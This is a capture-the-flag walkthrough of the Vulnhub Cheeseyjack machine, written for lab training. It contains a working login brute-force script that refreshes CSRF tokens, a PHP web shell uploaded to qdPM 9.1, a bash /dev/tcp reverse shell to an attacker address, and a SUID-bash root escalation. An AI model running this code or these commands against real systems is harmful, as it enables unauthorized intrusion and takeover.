## Cheesey: Cheeseyjack Vulnhub walkthrough

Skills:

- Web Enumeration
- NFS Enumeration
- Creating a custom dictionary with cewl
- Login Panel Brute Force [Python Scripting]
- Abusing qdPM 9.1 (PHP file upload) [RCE]
- Abusing sudoers privilege [Privilege Escalation]

### The walkthrough

We start with the port recognition phase using the tool `nmap`. We use the `-p-` option to encompass the entire range of ports, which is a total of 65535. We also use `--open` to list only the open ports, `-sS` for a stealthy and fast scanning mode, and `--min-rate 5000` to speed up the scan. We use `-vvv` to display each detected port on the console. The `-n` parameter is used to avoid DNS resolution, and then we use `-Pn` to instruct Nmap to ignore host discovery and treat all targets as if they were online. I perform this type of scan because we are in a controlled environment and need speed when resolving the machines.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n ipvictim
```

Now that we know the open ports on the victim machine, we will apply a more thorough scan with Nmap. Therefore, we will use the `-sCV` parameter to launch a set of basic reconnaissance scripts and detect the version and service running on each of the ports.

```bash
nmap -sCV -p22,80,111,139,445,2049,33060,33927,35597,43653,52975 ipvictim
```

Since port 80 is open, we assume that it has a web page. Let's use the tool `whatweb` to show us if it has a content management system and possible technologies running on the web server.

```bash
whatweb http://ipvictim
```

Since we don't see anything relevant, let's check port 111, which has the `rpcbind` service. We will use HackTricks to check how we can audit this port/service.

As we have port 2049 open, let's review the HackTricks link "2049 - Pentesting nfs service".

With the tool `showmount`, we can see if there are shared folders available on the victim machine.

```bash
showmount -e ipvictim
```

We see the `/home/ch33s3m4n` directory, and `ch33s3m4n` could be a valid user at the system level, so we could try to mount that directory on our computer. We create a directory with `mkdir /mnt/mounted` and follow the HackTricks example:

```bash
mount -t nfs ipvictim:/home/ch33s3m4n /mnt/mounted
```

We enter the `/mnt/mounted` directory and execute the following command to see the resources:

```bash
find . 2>/dev/null
```

We see that in the user's Downloads folder, there is a compressed file called `qdPM_9.1.zip` (qdPM is a free web-based project management tool), so we can deduce that the user could have installed that package on the system. To confirm that qdPM is installed on the system, we can use `gobuster` to apply brute-force recognition and see if we detect directories that match that tool.

```bash
gobuster dir -u http://ipvictim -w /usr/share/seclists/Discovery/Web-Content/directory-list-

2.3-medium.txt
```

We see the `/project_management` directory, so let's check that directory in the browser:

We see an authentication panel and also the qdPM 9.1 version. Let's try possible exploits with `searchsploit`:

```bash
searchsploit qdpm
```

We see a remote code execution exploit, but these exploits require credentials, and at the moment, we only have a possible username `ch33s3m4n`. So what we can try to do is gain access with this user through brute force. We can create a dictionary with `cewl` that creates a small dictionary using the words on the victim's website by running:

```bash
cewl http://ipvictim/ -w passwd.txt
cewl http://ipvictim/project_management/ >> passwd.txt
```

To automate the login by brute force with the newly created passwords and the user `ch33s3m4n`, we need to see what data is being sent via POST, and for this, we will use BURP SUITE.

We can see that there are several data points, and we need to be careful with `login[_csrf_token]=f51dfb2cf89888521bfe0faf66fddcae`, which is probably a dynamic string that changes with each request made. If we reuse the same token for all requests, it may not work, so it is better to generate a new token for each request, making our brute force authentication successful.

Knowing this, we will create our own Python script that automates brute force by incorporating the CSRF token for each request. Here you can see the complete explanation of the script.

```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
import re
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables
login_url = "http://ipvictim/project_management/index.php/login"

def makeBruteForce():
    f = open("passwd.txt", "r")
    p1 = log.progress("Brute Force")
    p1.status("Starting Brute Force Attack")
    time.sleep(2)
    counter = 1
    for passwd in f.readlines():
        passwd = passwd.strip()
        p1.status("Trying Password [%d/148]: %s" % (counter, passwd))
        s = requests.session()
        r = s.get(login_url)
        token = re.findall(r'_csrf_token*]" value="(.*?)"', r.text)[0]
        data_post = {
            'login[_csrf_token]': token,
            'login[email]': 'ch33s3m4n@cheeseyjack.local',
            'login[password]': passwd,
            'http_referer': 'http://ipvictim/project_management/'
        }
        r = s.post(login_url, data=data_post)
        if "No match" not in r.text:
            p1.success("The password is %s" % passwd)
            sys.exit(0)
        counter += 1

if __name__ == '__main__':
    makeBruteForce()
```

After running the script, we can see that it finds a valid password. So, let's try it on the website.

We have successfully logged in and now we will check if there is an option to upload files.

Indeed, there is an option, so we will try to upload a `cmd.php` file, but first we need to create this file:

```php
<?php
   echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

With this script, we can control the command we want to execute.

The website did not put any restrictions on us, so now we need to know in which directory the file was uploaded. To do this, we will use gobuster again:

```
gobuster dir -u http://ipvictim/project_management -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Now that we know the directory, let's go to the website and try `cmd=whoami` to verify that our script is running:

```
http://ipvictim/project_management/uploads/attachments/cmd.php?cmd=whoami
```

As we can see, our script is working. Now we can execute a reverse shell to gain access to the victim machine. To do this, we need to listen on port 443:

```
nc -nlvp 443
```

And in the browser, we add the reverse shell to the URL:

```
bash -c "bash -i >& /dev/tcp/attackerip/443 0>&1"
http://ipvictim/project_management/uploads/attachments/cmd.php?cmd=bash -c "bash -i >%26/dev/tcp/attackerip/443 0>%261"
```

Now that we have gained access to the machine, we apply a tty treatment for better console handling:

```
script /dev/null -c bash (press

 enter)
Ctrl + Z (press enter)
stty raw -echo; fg (press enter)
reset xterm (press enter)
export TERM=xterm (press enter)
export SHELL=/bin/bash (press enter)
stty rows 61 columns 186 (press enter)
```

Now it's time to escalate privileges.

We go to the home directory and see two users, the one we already knew existed and another one called "crab". We enter the crab user's directory and analyze what it has.

We see the file "todo.txt" and it gives us information about an SSH key backup in `/var/backups`, so we proceed to go to that directory to see what we find.

Indeed, we have a private key which we could use to connect as crab:

```
ssh -i key.bak crab@localhost
```

We have successfully logged in, we check what privileges the user has and we see that with `sudo -l` we have a root privilege which allows us to execute any binary in the crab user's folder with root permissions.

So, if we create a file in the folder `/home/crab/.bin/`:

```
touch a
```

Give it execution permissions:

```
chmod +x a
```

Add a command to the file:

```bash
#!/bin/bash

chmod u+s /bin/bash
```

By running the file with `sudo /home/crab/.bin/a`, we have given SUID permissions to bash and the owner is root. So, if we run `bash -p` it will grant us temporary access to the bash as the root owner, and we will have access to the root folder where we can see the flag in `root.txt`.
